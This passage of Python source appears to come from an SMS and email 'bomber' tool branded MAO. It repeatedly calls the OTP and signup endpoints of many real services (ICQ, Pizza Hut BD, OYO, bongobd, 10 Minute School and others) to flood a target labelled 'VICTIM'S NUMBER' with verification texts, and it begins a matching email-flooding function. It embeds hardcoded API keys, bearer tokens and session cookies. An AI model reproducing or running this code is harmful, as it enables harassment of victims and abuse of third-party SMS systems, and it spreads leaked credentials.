        print(logomao)
        print(f"{acl}_______________________________{gcl}MAO{acl}______________________________\n")
        print(f"{gcl}VICTIM'S NUMBER{acl} :{rcl} +{maocc}{maohungry}\n")
        print(f'{gcl}SELECTED COUNTRY {acl}: {bcl}{ccn}{ncl}\n')
        print(f'{gcl}SMS LIMIT {acl}: {pcl}{maothreat}\n')
        print(f'{gcl}SUCCESSFULLY SENT {acl}[{bcl} {mao1}{acl} ]{ccl}.{ncl}\n')
         
        if maothreat<=mao1:
          print(f"{acl}[{gcl} !{acl} ] {bcl}THANKS FOR USING THIS TOOL {acl}[{gcl} !{acl} ]")
          time.sleep(0.1)
          break
      else:
        pass
      header={"Host": "u.icq.net",
"Connection": "keep-alive",
"Content-Length": "143",
"Save-Data": "on",
"User-Agent": maoagents,
"Content-Type": "application/json",
"Accept": "*/*",
"Origin": "https://web.icq.com",
"Referer": "https://web.icq.com/",
"Accept-Encoding": "gzip, deflate, br",
"Accept-Language": "en-US,en;q=0.9,bn;q=0.8",}
      json={
"reqId":"21697-1632387350",
"params":{
	"phone":maonumber2,
	"language":"en-US",
	"route":"sms",
	"devId":"ic1rtwz1s1Hj1O0r",
	"application":"icq"
}
}
      icqnew=rpm("https://u.icq.net/api/v65/rapi/auth/sendCode",json=json,headers=header)
      if icqnew.status_code==200:
        mao1+=1
        osc("clear")
        print(logomao)
        print(f"{acl}_______________________________{gcl}MAO{acl}______________________________\n")
        print(f"{gcl}VICTIM'S NUMBER{acl} :{rcl} +{maocc}{maohungry}\n")
        print(f'{gcl}SELECTED COUNTRY {acl}: {bcl}{ccn}{ncl}\n')
        print(f'{gcl}SMS LIMIT {acl}: {pcl}{maothreat}\n')
        print(f'{gcl}SUCCESSFULLY SENT {acl}[{bcl} {mao1}{acl} ]{ccl}.{ncl}\n')
         
        if maothreat<=mao1:
          print(f"{acl}[{gcl} !{acl} ] {bcl}THANKS FOR USING THIS TOOL {acl}[{gcl} !{acl} ]")
          time.sleep(0.1)
          break
      else:
        pass
      
      quize=rpm("https://developer.quizgiri.xyz/api/v2.0/send-otp",data={"phone":maonumber,"country_code":"+"+maocc,"fcm_token":"null"})
      if quize.status_code==200: 
        mao1+=1
        osc("clear")
        print(logomao)
        print(f"{acl}_______________________________{gcl}MAO{acl}______________________________\n")
        print(f"{gcl}VICTIM'S NUMBER{acl} :{rcl} +{maocc}{maohungry}\n")
        print(f'{gcl}SELECTED COUNTRY {acl}: {bcl}{ccn}{ncl}\n')
        print(f'{gcl}SMS LIMIT {acl}: {pcl}{maothreat}\n')
        print(f'{gcl}SUCCESSFULLY SENT {acl}[{bcl} {mao1}{acl} ]{ccl}.{ncl}\n')

         
        if maothreat<=mao1:
          print(f"{acl}[{gcl} !{acl} ] {bcl}THANKS FOR USING THIS TOOL {acl}[{gcl} !{acl} ]")
          time.sleep(0.1)
          break
      else:
        pass
      quizere=rpm("https://developer.quizgiri.xyz/api/v2.0/retry-otp",data={"phone":maonumber,"country_code":maocc})
      if quizere.status_code==200:
        mao1+=1
        osc("clear")
        print(logomao)
        print(f"{acl}_______________________________{gcl}MAO{acl}______________________________\n")
        print(f"{gcl}VICTIM'S NUMBER{acl} :{rcl} +{maocc}{maohungry}\n")
        print(f'{gcl}SELECTED COUNTRY {acl}: {bcl}{ccn}{ncl}\n')
        print(f'{gcl}SMS LIMIT {acl}: {pcl}{maothreat}\n')
        print(f'{gcl}SUCCESSFULLY SENT {acl}[{bcl} {mao1}{acl} ]{ccl}.{ncl}\n')

         
        if maothreat<=mao1:
          print(f"{acl}[{gcl} !{acl} ] {bcl}THANKS FOR USING THIS TOOL {acl}[{gcl} !{acl} ]")
          time.sleep(0.1)
          break
      else:
        pass
      quizere=rpm("https://developer.quizgiri.xyz/api/v2.0/retry-otp",data={"phone":maonumber,"country_code":maocc})
      if quizere.status_code==200:
        mao1+=1
        osc("clear")
        print(logomao)
        print(f"{acl}_______________________________{gcl}MAO{acl}______________________________\n")
        print(f"{gcl}VICTIM'S NUMBER{acl} :{rcl} +{maocc}{maohungry}\n")
        print(f'{gcl}SELECTED COUNTRY {acl}: {bcl}{ccn}{ncl}\n')
        print(f'{gcl}SMS LIMIT {acl}: {pcl}{maothreat}\n')
        print(f'{gcl}SUCCESSFULLY SENT {acl}[{bcl} {mao1}{acl} ]{ccl}.{ncl}\n')

         
        if maothreat<=mao1:
          print(f"{acl}[{gcl} !{acl} ] {bcl}THANKS FOR USING THIS TOOL {acl}[{gcl} !{acl} ]")
          time.sleep(0.1)
          break
      else:
        pass
      hoicoi=rpm("https://prod-api.viewlift.com/identity/signup?site=hoichoitv",headers={"Host":"prod-api.viewlift.com","User-Agent": maonumber,"Accept":"application/json, text/plain, */*","Content-Type":"application/json;charset=utf-8","x-api-key":"PBSooUe91s7RNRKnXTmQG7z3gwD2aDTA6TlJp6ef","Connection":"keep-alive"},data="""{\"requestType\":\"send\",\"phoneNumber\":\""""+maonumber3+"""\",\"emailConsent\":true,\"whatsappConsent\":true,\"email\":\"ekramu5699@gmail.com\"}""")
      if hoicoi.status_code==200:
        mao1+=1
        osc("clear")
        print(logomao)
        print(f"{acl}_______________________________{gcl}MAO{acl}______________________________\n")
        print(f"{gcl}VICTIM'S NUMBER{acl} :{rcl} +{maocc}{maohungry}\n")
        print(f'{gcl}SELECTED COUNTRY {acl}: {bcl}{ccn}{ncl}\n')
        print(f'{gcl}SMS LIMIT {acl}: {pcl}{maothreat}\n')
        print(f'{gcl}SUCCESSFULLY SENT {acl}[{bcl} {mao1}{acl} ]{ccl}.{ncl}\n')

         
        if maothreat<=mao1:
          print(f"{acl}[{gcl} !{acl} ] {bcl}THANKS FOR USING THIS TOOL {acl}[{gcl} !{acl} ]")
          time.sleep(0.1)
          break
      else:
        pass
      fundesh=rpm("https://fundesh.com.bd/api/auth/generateOTP?service_key=",json={"msisdn":maohungry},headers={"Content-Type" : "application/json; charset=utf-8","Accept" : "application/json, text/plain, */*","User-Agent":maoagents})
      if fundesh.status_code==200: 
        mao1+=1
        osc("clear")
        print(logomao)
        print(f"{acl}_______________________________{gcl}MAO{acl}______________________________\n")
        print(f"{gcl}VICTIM'S NUMBER{acl} :{rcl} +{maocc}{maohungry}\n")
        print(f'{gcl}SELECTED COUNTRY {acl}: {bcl}{ccn}{ncl}\n')
        print(f'{gcl}SMS LIMIT {acl}: {pcl}{maothreat}\n')
        print(f'{gcl}SUCCESSFULLY SENT {acl}[{bcl} {mao1}{acl} ]{ccl}.{ncl}\n')

         
        if maothreat<=mao1:
          print(f"{acl}[{gcl} !{acl} ] {bcl}THANKS FOR USING THIS TOOL {acl}[{gcl} !{acl} ]")
          time.sleep(0.1)
          break
      else:
        pass
      fundeshre=rpm("https://fundesh.com.bd/api/auth/resendOTP",json={"msisdn":maohungry},headers={"Content-Type" : "application/json; charset=utf-8","Accept" : "application/json, text/plain, */*","User-Agent":maoagents})
      if fundeshre.status_code==200:
        mao1+=1
        osc("clear")
        print(logomao)
        print(f"{acl}_______________________________{gcl}MAO{acl}______________________________\n")
        print(f"{gcl}VICTIM'S NUMBER{acl} :{rcl} +{maocc}{maohungry}\n")
        print(f'{gcl}SELECTED COUNTRY {acl}: {bcl}{ccn}{ncl}\n')
        print(f'{gcl}SMS LIMIT {acl}: {pcl}{maothreat}\n')
        print(f'{gcl}SUCCESSFULLY SENT {acl}[{bcl} {mao1}{acl} ]{ccl}.{ncl}\n')

             
        if maothreat<=mao1:
          print(f"{acl}[{gcl} !{acl} ] {bcl}THANKS FOR USING THIS TOOL {acl}[{gcl} !{acl} ]")
          time.sleep(0.1)
          break
      else:
        pass
      bioscope=rpm('https://stage.bioscopelive.com/en/login/send-otp?phone='+maonumber2+'&operator=bd-otp',headers={"User-Agent":maoagents})

      if bioscope.status_code==200  : 
        mao1+=1
        osc("clear")
        print(logomao)
        print(f"{acl}_______________________________{gcl}MAO{acl}______________________________\n")
        print(f"{gcl}VICTIM'S NUMBER{acl} :{rcl} +{maocc}{maohungry}\n")
        print(f'{gcl}SELECTED COUNTRY {acl}: {bcl}{ccn}{ncl}\n')
        print(f'{gcl}SMS LIMIT {acl}: {pcl}{maothreat}\n')
        print(f'{gcl}SUCCESSFULLY SENT {acl}[{bcl} {mao1}{acl} ]{ccl}.{ncl}\n')

         
        if maothreat<=mao1:
          print(f"{acl}[{gcl} !{acl} ] {bcl}THANKS FOR USING THIS TOOL {acl}[{gcl} !{acl} ]")
          time.sleep(0.1)
          break
      else:
        pass
      meenaclick=rpm('https://api.meenaclick.com/api/front/sms/send/pin',json={"cell_phone":"88"+maonumber,"type":"sign-up"},headers={"Accept" : "application/json, text/plain, */*",'Content-Type' : 'application/json',"User-Agent":maoagents})
      if meenaclick.status_code==202 :
        mao1+=1
        osc("clear")
        print(logomao)
        print(f"{acl}_______________________________{gcl}MAO{acl}______________________________\n")
        print(f"{gcl}VICTIM'S NUMBER{acl} :{rcl} +{maocc}{maohungry}\n")
        print(f'{gcl}SELECTED COUNTRY {acl}: {bcl}{ccn}{ncl}\n')
        print(f'{gcl}SMS LIMIT {acl}: {pcl}{maothreat}\n')
        print(f'{gcl}SUCCESSFULLY SENT {acl}[{bcl} {mao1}{acl} ]{ccl}.{ncl}\n')
        
        if maothreat<=mao1:
          print(f"{acl}[{gcl} !{acl} ] {bcl}THANKS FOR USING THIS TOOL {acl}[{gcl} !{acl} ]")
          time.sleep(0.1)
          break
      else:
        pass
      header={"Host": "u.icq.net",
"Connection": "keep-alive",
"Content-Length": "143",
"Save-Data": "on",
"User-Agent": maoagents,
"Content-Type": "application/json",
"Accept": "*/*",
"Origin": "https://web.icq.com",
"Referer": "https://web.icq.com/",
"Accept-Encoding": "gzip, deflate, br",
"Accept-Language": "en-US,en;q=0.9,bn;q=0.8",}
      json={
"reqId":"21697-1632387350",
"params":{
	"phone":maonumber2,
	"language":"en-US",
	"route":"sms",
	"devId":"ic1rtwz1s1Hj1O0r",
	"application":"icq"
}
}
      icqnew=rpm("https://u.icq.net/api/v65/rapi/auth/sendCode",json=json,headers=header)
      if icqnew.status_code==200: 
        mao1+=1
        osc("clear")
        print(logomao)
        print(f"{acl}_______________________________{gcl}MAO{acl}______________________________\n")
        print(f"{gcl}VICTIM'S NUMBER{acl} :{rcl} +{maocc}{maohungry}\n")
        print(f'{gcl}SELECTED COUNTRY {acl}: {bcl}{ccn}{ncl}\n')
        print(f'{gcl}SMS LIMIT {acl}: {pcl}{maothreat}\n')
        print(f'{gcl}SUCCESSFULLY SENT {acl}[{bcl} {mao1}{acl} ]{ccl}.{ncl}\n')
         
        if maothreat<=mao1:
          print(f"{acl}[{gcl} !{acl} ] {bcl}THANKS FOR USING THIS TOOL {acl}[{gcl} !{acl} ]")
          time.sleep(0.1)
          break
      else:
        pass
      hungrynaki=rpm("https://api-v4-2.hungrynaki.com/graphql", json = {'query': '\nmutation CreateOtp (\n    $phone: PhoneNumber!\n    $country: String!\n    $uuid: String!\n    $osVersionCode: String\n    $deviceBrand: String\n    $deviceModel: String\n    $requestFrom: String\n) {\n    createOtp(\n        auth: {\n            phone: $phone,\n            countryCode: $country,\n            deviceUuid: $uuid,\n            deviceToken: ""\n        }\n        device: {\n            deviceType: WEB\n            osVersionCode: $osVersionCode\n            deviceBrand: $deviceBrand\n            deviceModel: $deviceModel\n        }\n        requestFrom: $requestFrom\n    ){\n        statusCode\n    }\n}\n', 'variables': {'phone': maohungry, 'country': maocc, 'uuid': '64b9bb81-93f3-4757-9e92-9cfbf34d8039', 'osVersionCode': 'Linux armv8l', 'deviceBrand': 'Chrome', 'deviceModel': '89', 'requestFrom': 'U2FsdGVkX18QITR3WakOCR2OK+zoIpqM7DqxiLf915s='}},headers={"User-Agent":maoagents})
      if hungrynaki.status_code==200: 
        mao1+=1
        osc("clear")
        print(logomao)
        print(f"{acl}_______________________________{gcl}MAO{acl}______________________________\n")
        print(f"{gcl}VICTIM'S NUMBER{acl} :{rcl} +{maocc}{maohungry}\n")
        print(f'{gcl}SELECTED COUNTRY {acl}: {bcl}{ccn}{ncl}\n')
        print(f'{gcl}SMS LIMIT {acl}: {pcl}{maothreat}\n')
        print(f'{gcl}SUCCESSFULLY SENT {acl}[{bcl} {mao1}{acl} ]{ccl}.{ncl}\n')
         
        if maothreat<=mao1:
          print(f"{acl}[{gcl} !{acl} ] {bcl}THANKS FOR USING THIS TOOL {acl}[{gcl} !{acl} ]")
          time.sleep(0.1)
          break
      else:
        pass
      pizzahut=rpm("https://m.pizzahutbd.com/customer/sign-in/mobile",data="_token=nu1fmvsEvym9b8h3l7TGH3SSKauUvDbJHyefRuVS&phone_number="+maonumber,headers={"Host": "m.pizzahutbd.com","Connection": "keep-alive","Content-Length": "72","Upgrade-Insecure-Requests": "1","Origin": "https://m.pizzahutbd.com","Content-Type": "application/x-www-form-urlencoded","Save-Data": "on","User-Agent": maoagents,"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","Referer": "https://m.pizzahutbd.com/customer/login","Accept-Encoding": "gzip, deflate, br","Cookie": "_gcl_au=1.1.1377964494.1627362075; _ga=GA1.2.1350470443.1627362078; _fbp=fb.1.1627362078606.576170593; _gid=GA1.2.868591897.1628186704; _gat_gtag_UA_110954706_5=1; _gat_gtag_UA_150642375_1=1; _gat_UA-150642375-1=1; XSRF-TOKEN=eyJpdiI6IlIrNFQ4czZOa3lHNkNBV3RncHpzTHc9PSIsInZhbHVlIjoiK1ZEZWg4TXhDcWtCdnc4NVRmb2REcENpOXJTTndMcFNoRkJjbDIzVlFZcEZvSkVhVlpXTCtJYzhWcXVaZmxITCIsIm1hYyI6IjMyNmVhNjMwYTFlMWUwM2YzNWJjNDJhYTkzYjA3MTlmOTBiZTkxMTU0MDM1NDRlMWI2NjQwN2IwNzQzMjY5MzAifQ%3D%3D; laravel_session=eyJpdiI6ImVjZGlHdUxSY1drMFVBWnRTR0NhbVE9PSIsInZhbHVlIjoiN3NkOXNlMGQxVGwra2duVUxYTHRydFVDeGRWZ2hXVW1saTlvSmh3U3RVTnZiMzVLc1hNTCtUN2tuK1QxUjBHMCIsIm1hYyI6IjhkNTA4ZDZmNGI5OWEyMzEzMjAxODBiZTkzZDJmZmQ4MDRhMzUyNWNkNjhkMGJhNTAyN2U1ZmE0YWI0YWQyNTUifQ%3D%3D"})
      if pizzahut.status_code==200:
        mao1+=1
        osc("clear")
        print(logomao)
        print(f"{acl}_______________________________{gcl}MAO{acl}______________________________\n")
        print(f"{gcl}VICTIM'S NUMBER{acl} :{rcl} +{maocc}{maohungry}\n")
        print(f'{gcl}SELECTED COUNTRY {acl}: {bcl}{ccn}{ncl}\n')
        print(f'{gcl}SMS LIMIT {acl}: {pcl}{maothreat}\n')
        print(f'{gcl}SUCCESSFULLY SENT {acl}[{bcl} {mao1}{acl} ]{ccl}.{ncl}\n')
        
        if maothreat<=mao1:
          print(f"{acl}[{gcl} !{acl} ] {bcl}THANKS FOR USING THIS TOOL {acl}[{gcl} !{acl} ]")
          time.sleep(0.1)
          break
      else:
        pass
      

      bongobd=rpm("https://api2.bongobd.com/api/login/send-otp",headers={"Host": "api2.bongobd.com","Connection": "keep-alive","Content-Length": "43","Origin": "https://bongobd.com","authorization": "Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJyb2xlcyI6WyJST0xFX1VTRVJfQklPU0NPUEUiLCJST0xFX1VTRVIiLCJST0xFX1VTRVJfQU5PTllNT1VTIl0sInVzZXJuYW1lIjoiYW5vbnltb3VzIiwiY2xpZW50X2xvZ2luX2lkIjo0OTUxOTg3MDA4MiwiY2xpZW50X2lkIjpudWxsLCJwbGF0Zm9ybV9pZCI6ImFiZmVhNDYyLWY2NGQtNDkxZS05Y2Q5LTc1ZWUwMDFmNDViMCIsImJvbmdvX2lkIjoiZDQzMjJkMTUtMmE5YS00ZDI2LWI0YmYtZjQ2NDAzMWQ5MmMxIiwiaWF0IjoxNjI5ODk4Njc4LCJleHAiOjE2MzI0OTA2ODguMH0.CZYJTcvK25cKKaIsfyH1jsdlbsT_6o-KlxyW4GGda92isprdI9KhzG_D-WoJT_-PHU1iTWU2p4O9P9mk9627x7u8pLMKLOPcs0rt4qVUIIu2LbCo27aJcw7zi7Tlp37ZXmMD80st8TVhK4y8nlmdPRkgmBgqnbyimNlLyjMfz9N9IQZ5rM_CngA6yptYDb3WIu-eeLtaYUhGa7PHkiCBTw4SziJDZQz-Wh6axBUuiGq-8izflZOK6OQBZ-bkQZWWjOwhXow0z4XaSHS5u66vglKKpi5HMQEK9HTGnOp7RUtH2bQp58crWTsL0prFpOaeH202hPK3_ssvTA24M9dM_N4N8NdXaEU_zy5bL90KInRaMshd2ejtiisu11DxL6Nqtpv8ZvVqqgBeriMZ4uMtXMsVBNArRJCiXHAMGZg3g5VvzfMTMyw58lUW__3voBJzN8s5MZDs6lR1fzIpuyoKMJW4SAkTSD12oYnNzyDBtL7Ubj9qSfrDKYGbM0tKGMN6xJKwLP9isApEdw72II3v2X-LyWgkANowth8EZo7MU-a09XPMg-Axrjh2zogP37HioYQ3LGFqOuBrvzgTFm8wwrmcCbiyP5bdJMFEq8SyP0Ol_UYjogQ_6pI9NIOHJDMxnqSLFznsy2MWXfaVJ1vJVw6DtmJz2GoYrGgFsx5xxtk","content-type": "application/json","accept": "application/json","platform-id": "abfea462-f64d-491e-9cd9-75ee001f45b0","access-code": "QkQ%3D","User-Agent": maoagents,"Save-Data": "on","Referer": "https://bongobd.com/","Accept-Encoding": "gzip, deflate, br","Accept-Language": "en-US,en;q=0.9,bn;q=0.8",},json={"operator":"all","msisdn":maonumber2})
      if bongobd.status_code==200: 
        mao1+=1
        osc("clear")
        print(logomao)
        print(f"{acl}_______________________________{gcl}MAO{acl}______________________________\n")
        print(f"{gcl}VICTIM'S NUMBER{acl} :{rcl} +{maocc}{maohungry}\n")
        print(f'{gcl}SELECTED COUNTRY {acl}: {bcl}{ccn}{ncl}\n')
        print(f'{gcl}SMS LIMIT {acl}: {pcl}{maothreat}\n')
        print(f'{gcl}SUCCESSFULLY SENT {acl}[{bcl} {mao1}{acl} ]{ccl}.{ncl}\n')

         
        if maothreat<=mao1:
          print(f"{acl}[{gcl} !{acl} ] {bcl}THANKS FOR USING THIS TOOL {acl}[{gcl} !{acl} ]")
          time.sleep(0.1)
          break
      else:
        pass
      
      minit=rpm("https://lms.10minuteschool.com/api/v4/auth/sendOtp",data={"phone":{"number":minmao2,"internationalNumber":"+"+minmao2,"nationalNumber":minmao,"e164Number":"+"+minmao2,"countryCode":"BD","dialCode":"+880"},"contact":'88'+maonumber,"type":"phone"} ,headers={"User-Agent":maoagents})
      if minit.status_code==200: 
        mao1+=1
        osc("clear")
        print(logomao)
        print(f"{acl}_______________________________{gcl}MAO{acl}______________________________\n")
        print(f"{gcl}VICTIM'S NUMBER{acl} :{rcl} +{maocc}{maohungry}\n")
        print(f'{gcl}SELECTED COUNTRY {acl}: {bcl}{ccn}{ncl}\n')
        print(f'{gcl}SMS LIMIT {acl}: {pcl}{maothreat}\n')
        print(f'{gcl}SUCCESSFULLY SENT {acl}[{bcl} {mao1}{acl} ]{ccl}.{ncl}\n')

         
        if maothreat<=mao1:
          print(f"{acl}[{gcl} !{acl} ] {bcl}THANKS FOR USING THIS TOOL {acl}[{gcl} !{acl} ]")
          time.sleep(0.1)
          break
      else:
        pass
      headoyo={"Host": "www.oyorooms.com","Connection": "keep-alive","Content-Length": "123","deviceid": "ca8b74a27a2c2ea0c7a53159be83bbcd","consumer_host": "https://www.oyorooms.com","User-Agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Mobile Safari/537.36","sData": "eyJrdWQiOlsyNTEwMCwxNjgwMCwxNjgwMCwxNTYwMCwxMjcwMCw4OTg1MDAsMTA2NTAwMCwxMzQwMCwxNjUwMCwxNTcwMCw2OTQ4MDAsODY3MzAwLDEwMTQ5MDAsMTcxMDAsMTAzMDAsMTc1MDAsMTY4MDAsMjcxMDAsMjAwMDAsMjk3MDAsMzI5MDAsMzYwMDAsNDgxMTAwLDYzNjkwMCwyMTQwMCwyNTMwMCwzNDgwMCwyMTgwMCwyODYwMCw2NDc3MDAsMjQ5MDAsMjY1MDAsNDMxMzAwLDYxMDYwMCw4MDk5MDAsMTA5MDAsMjE0MDAsMTI0MDAsMTA3MDAsMjIyMDAsMTYzMDAsMjY2MDBdLCJhY2MiOltdLCJneXIiOltdLCJ0dWQiOls3OTAwLDYyMjAwLDI4MTcwMCwxNjUyMDAsMjYyMTAwLjAwMDAwMDAwMDAzLDEzMzQwMCwyNjQ2MDAsMjk4NTAwLDkwMTgwMCwxODI0MDAsMTQxNzAwLDI0NTkwMCwxMzI2MDAsMjYxODk5Ljk5OTk5OTk5OTk3LDk2ODAwLDk1OTAwLDk1ODAwLDE4MjAwMCwyODIzMDAsMTUyMTAwLDE2NTQwMCw1MzA4MDAsMTE1NTAwLDQ0NzgwMCw2MzI1MDAsNjU0MDAuMDAwMDAwMDAwMDEsMjAwMCw4MDcwMF0sInRpZCI6WzY2OTc1MDAsMTM4OTEwMCw0MjE3MzAwLDEzNzQwMCwxMDM0MDAsMTE3NTAwLDEwMzYwMCwxMDA3MDAsMTUwNjMwMCwxMTg2MDAsMTU5NDAwLDEyMTYwMCwxMzUyMDAsMTIyNDAwLDU4NjgwMCwxMzQ2MzUwMCw2NzA3NDAwLDkyMjEwMCwxMDA4MDAsMTM1MzAwLDExODUwMCwxMjAxMDAsMTM1MTAwLDEyMDkwMCwxMTk5MDAsMTY3NjAwLDY0MTUwMCw3ODM1ODAwXSwia2lkIjpbMjI5MTAxMDAsMjAwMDAwLDI4NjEwMCwyMzMyMDAsMTY3NTAwLDIwNTYwMCwxODc2MDAsNjE5OTAwLDY5MDgwMCwyODE4MDAsNTI2ODAwLDMwMDQwMCwzODM2MDAsMjkzNjAwLDEyOTYwMCwxNTcxODcwMCwxNjc4MDAsNDgwNjAwLDE3OTcwMCwxNzc2MDAsMTk2ODAwLDE4MjQwMCwyMDI4MDAsMTc1NzAwLDQ3NTgwMCwyNzQ4MDAsNDI5NjAwLDI4NjgwMCw0MDcwMDAsMjY2OTAwLDEzMDMwMC4wMDAwMDAwMDAwMV0sInRtdiI6W1t7IngiOjIwMiwieSI6NDI0fSx7IngiOjIwNiwieSI6NDE2fSx7IngiOjI1MiwieSI6MzM2fV0sW3sieCI6MjIyLCJ5IjozOTZ9LHsieCI6MjI1LCJ5IjozOTJ9LHsieCI6MjQ2LCJ5IjozNjJ9XSxbeyJ4IjoyMTgsInkiOjQyOX0seyJ4IjoyMjUsInkiOjQxNH0seyJ4IjoyODQsInkiOjMxMH1dLFt7IngiOjI1MiwieSI6MzYwfSx7IngiOjI3MCwieSI6MzMwfSx7IngiOjI3NiwieSI6MzE4fV0sW3sieCI6MjQwLCJ5IjozOTJ9LHsieCI6MjQzLCJ5IjozODV9LHsieCI6Mjg1LCJ5IjozMTB9XSxbeyJ4IjoyNDMsInkiOjM3OX0seyJ4IjoyNTAsInkiOjM2N30seyJ4IjoyODcsInkiOjI5OH1dLFt7IngiOjIzOSwieSI6Mzg4fSx7IngiOjI0NCwieSI6Mzc5fSx7IngiOjI2OCwieSI6MzQwfSx7IngiOjI4NiwieSI6MzA5fSx7IngiOjI4NiwieSI6MzA5fV0sW3sieCI6MjM3LCJ5IjozODV9LHsieCI6MjQyLCJ5IjozNzB9LHsieCI6MjY2LCJ5IjozMTV9XSxbeyJ4IjoyNDAsInkiOjM2N30seyJ4IjoyNDIsInkiOjM2NH0seyJ4IjoyNjAsInkiOjM0MH0seyJ4IjoyOTIsInkiOjI3OH1dLFt7IngiOjI0MiwieSI6MzU2fSx7IngiOjI0NSwieSI6MzUxfSx7IngiOjI3OSwieSI6Mjk0fSx7IngiOjI4NCwieSI6Mjg1fSx7IngiOjI4NiwieSI6MjgxfV1dfQ==","loc": "153","Content-Type": "application/json","XSRF-TOKEN": "8y0DTlO4-1opL8bxtSEPTmrGZLqZLPF-MZVk","Save-Data": "on","access_token": "SFI4TER1WVRTakRUenYtalpLb0w6VnhrNGVLUVlBTE5TcUFVZFpBSnc=","Accept": "*/*","Origin": "https://www.oyorooms.com","Referer": "https://www.oyorooms.com/login?truecaller=hide&retUrl=/","Accept-Encoding": "gzip, deflate, br","Cookie": "_csrf=Ky39tbIq89oBz794FWfFLwws; acc=IN; X-Location=georegion%3D21%2Ccountry_code%3DBD%2Ccity%3DDHAKA%2Clat%3D23.72%2Clong%3D90.41%2Ctimezone%3DGMT%2B6%2Ccontinent%3DAS%2Cthroughput%3Dvhigh%2Cbw%3D5000%2Casnum%3D24389%2Cnetwork_type%3Dmobile%2Clocation_id%3D0; mab=348d1e5fceab66b7e7e4b5634f473005; expd=mww2%3A1%7Cioab%3A0%7Cmhdp%3A1%7Cbcrp%3A0%7Cpwbs%3A1%7Chsdm%3A2%7Clpex%3A1%7Cgmab%3A0%7Cprdp%3A1%7Ccomp%3A0%7Csldw%3A1%7Cmdab%3A0%7Cnrmp%3A1%7Cnhyw%3A0%7Cwboi%3A1%7Csst%3A1%7Ctxwb%3A1%7Cpod2%3A1%7Clnhd%3A1%7Cppsi%3A0%7Cgcer%3A0%7Crecs%3A1%7Clvhm%3A1%7Cgmbr%3A0%7Cyolo%3A1%7Crcta%3A1%7Ccbot%3A1%7Cotpv%3A1%7Ctrtr%3A1%7Cndbp%3A0%7Cmapu%3A1%7Cnclc%3A0%7Cdwsl%3A1%7Ceopt%3A1%7Cotpv%3A1%7Cwizi%3A0%7Cmorr%3A1%7Cyopb%3A1%7CTTP%3A1%7Cweb2%3A0; appData=%7B%22userData%22%3A%7B%22isLoggedIn%22%3Afalse%7D%7D; token=SFI4TER1WVRTakRUenYtalpLb0w6VnhrNGVLUVlBTE5TcUFVZFpBSnc%3D; _uid=Not%20logged%20in; XSRF-TOKEN=8y0DTlO4-1opL8bxtSEPTmrGZLqZLPF-MZVk; isHomepageViewed=true; fingerprint2=ca8b74a27a2c2ea0c7a53159be83bbcd; ql=false; _gcl_au=1.1.583181566.1629716901; tvc_utm_source=(direct); tvc_utm_medium=(none); tvc_utm_campaign=(not set); tvc_utm_key=(not set); tvc_utm_content=(not set); AMP_TOKEN=%24NOT_FOUND; _ga=GA1.2.434777464.1629716902; _gid=GA1.2.261760468.1629716902; _gat=1; _fbp=fb.1.1629716902453.881953823; moe_uuid=b76ab167-2627-493b-b022-67c90a5fed58"}
      urloyo="https://www.oyorooms.com/api/pwa/generateByPhone?locale=en"
      dataoyo="""{
\"phone\":\""""+maohungry+"""\",
\"country_code\":\"+"""+maocc+"""\",
\"country_iso_code\":\"IN\",
\"nod\":4,
\"send_otp\":true,
\"devise_role\":\"Consumer_Guest\"
}"""
      requestsoyo=rpm(urloyo,data=dataoyo,headers=headoyo)
      if requestsoyo.status_code==200: 
        mao1+=1
        osc("clear")
        print(logomao)
        print(f"{acl}_______________________________{gcl}MAO{acl}______________________________\n")
        print(f"{gcl}VICTIM'S NUMBER{acl} :{rcl} +{maocc}{maohungry}\n")
        print(f'{gcl}SELECTED COUNTRY {acl}: {bcl}{ccn}{ncl}\n')
        print(f'{gcl}SMS LIMIT {acl}: {pcl}{maothreat}\n')
        print(f'{gcl}SUCCESSFULLY SENT {acl}[{bcl} {mao1}{acl} ]{ccl}.{ncl}\n')

         
        if maothreat<=mao1:
          print(f"{acl}[{gcl} !{acl} ] {bcl}THANKS FOR USING THIS TOOL {acl}[{gcl} !{acl} ]")
          time.sleep(0.1)
          break
      else:
        pass
      header={"Host": "u.icq.net",
"Connection": "keep-alive",
"Content-Length": "143",
"Save-Data": "on",
"User-Agent": maoagents,
"Content-Type": "application/json",
"Accept": "*/*",
"Origin": "https://web.icq.com",
"Referer": "https://web.icq.com/",
"Accept-Encoding": "gzip, deflate, br",
"Accept-Language": "en-US,en;q=0.9,bn;q=0.8",}
      json={
"reqId":"21697-1632387350",
"params":{
	"phone":maonumber2,
	"language":"en-US",
	"route":"sms",
	"devId":"ic1rtwz1s1Hj1O0r",
	"application":"icq"
}
}
      icqnew=rpm("https://u.icq.net/api/v65/rapi/auth/sendCode",json=json,headers=header)
      if icqnew.status_code==200: 
        mao1+=1
        osc("clear")
        print(logomao)
        print(f"{acl}_______________________________{gcl}MAO{acl}______________________________\n")
        print(f"{gcl}VICTIM'S NUMBER{acl} :{rcl} +{maocc}{maohungry}\n")
        print(f'{gcl}SELECTED COUNTRY {acl}: {bcl}{ccn}{ncl}\n')
        print(f'{gcl}SMS LIMIT {acl}: {pcl}{maothreat}\n')
        print(f'{gcl}SUCCESSFULLY SENT {acl}[{bcl} {mao1}{acl} ]{ccl}.{ncl}\n')
        
        if maothreat<=mao1:
          print(f"{acl}[{gcl} !{acl} ] {bcl}THANKS FOR USING THIS TOOL {acl}[{gcl} !{acl} ]")
          time.sleep(0.1)
          break
      else:
        pass
  except KeyboardInterrupt:
    time.sleep(0.3)
    exit(f"\n{acl}[{rcl} !{acl} ]{rcl} ABORTING... {acl}[{rcl} !{acl} ]\n")
    time.sleep(0.09)
  except Exception as ss:
      exit(ss)
def mails(mail,threat):
  nil=1
  threat=int(threat)
  while nil <= threat:
    
    url = 'https://m.cricbuzz.com/cbplus/auth/user/login'
      
    headers={'Content-Type' : 'application/json'}
    data = {"username":mail ,"provider":"Email"}
    try:
      mailreq=requests.post(url,json=data,headers=headers)
      if mailreq.status_code ==200:
        nil+=1 
        osc("clear")
        print(logomao)
        print(f"{acl}_______________________________{gcl}MAO{acl}______________________________\n")
        print(f"{gcl}VICTIM'S MAIL{acl} :{rcl} {mail}\n")
